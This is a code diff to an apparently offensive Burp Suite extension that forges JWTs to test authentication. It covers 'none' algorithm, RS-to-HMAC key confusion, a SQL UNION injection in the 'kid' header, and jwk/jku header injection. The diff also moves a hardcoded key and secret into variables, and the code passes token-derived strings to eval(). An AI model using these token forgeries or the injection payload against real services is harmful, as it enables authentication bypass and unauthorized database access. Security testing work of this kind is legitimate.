@@ -41,17 +41,6 @@ class BurpExtender(IBurpExtender, IHttpListener, IHttpRequestResponse):
         self.checked_URL = []
         self.EncryptionAlg = {"RS256":"HMAC256", "RS384": "HMAC384", "RS512": "HMAC512"}
         self.attack_scenarios = ["WIPE", "none", "TOHMAC", "KIDSQLi", "JKU", "JWKH"]
-        self.public_key = '''
-        -----BEGIN PUBLIC KEY-----
-        MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl02jsZRcv9e0U7gRrhio
-        H4ZegmLNmRlu71CB/+eVBwyWuNmOPtMgp6kPqgkxXpJjWh2dSfeTa48pBSlxioSV
-        VmExXtAjHr54fYQvolSMiSbyeaZIScKkOBZ8t+6xl/nXlTzI1d+su+tBlHMB3F66
-        Dz7eHwd+Hu5bLKhnKS6qkrpMB5oNcLClkpXYuTU23ulEiNw4sBmQ+NUqTPkzJ6Se
-        i8XVbV72/e7SGJlYSZcWRQ3QyGMV+GhwIYm0Q0Dlm9pAtOUYoQHBF7aTXv6ZEWR8
-        YntjLA0X7PIpHhtHf2OyJ9UBRCdKSteDIlLAorpGgS/PL1CrlhIYfwb4AMPWW4eY
-        oQIDAQAB
-        -----END PUBLIC KEY-----
-        '''
         self._callbacks.printOutput(self.banner)
 
         return
@@ -173,13 +162,13 @@ class BurpExtender(IBurpExtender, IHttpListener, IHttpRequestResponse):
                 if "Authorization:" in hdr:
                     JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                     if JWT_H.__contains__("kid"):
-                        JWT_H["kid"] = "BULK'/*X*/UNION/*X*/SELECT/*X*/'{}'--".format(self.public_key.replace(" ", "/**/"))
+                        JWT_H["kid"] = "BULK'/*X*/UNION/*X*/SELECT/*X*/'{}'--".format(public_key.replace(" ", "/**/"))
                         del JWT_H["typ"]
                         JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                         for alg in self.EncryptionAlg:
                             if JWT_H["alg"] == alg:
                                 del JWT_H["alg"]
-                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, '{}')".format(JWT_H, JWT_P, "s3cr3t"))
+                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, '{}')".format(JWT_H, JWT_P, secret))
                                 njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
                                 Modheaders.append(njwt_hdr)
                                 break
@@ -227,7 +216,7 @@ class BurpExtender(IBurpExtender, IHttpListener, IHttpRequestResponse):
                 if "Authorization:" in hdr:
                     JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
                     if JWT_H.__contains__("jwk"):
-                        JWT_H["jwk"] = "{}".format(self.public_key)
+                        JWT_H["jwk"] = "{}".format(public_key)
                         del JWT_H["typ"]
                         JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
                         for alg in self.EncryptionAlg:
